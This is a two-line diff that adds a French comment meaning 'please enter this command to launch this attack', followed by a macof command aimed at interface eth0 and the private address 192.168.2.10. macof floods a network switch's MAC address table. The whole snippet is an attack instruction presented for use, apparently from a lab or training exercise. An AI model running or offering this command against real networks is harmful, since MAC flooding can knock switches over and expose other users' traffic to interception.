@@ -1,0 +1,2 @@
+# veuillez saisir cette commande pour lancer cette attaque
+macof -i eth0 -d 192.168.2.10
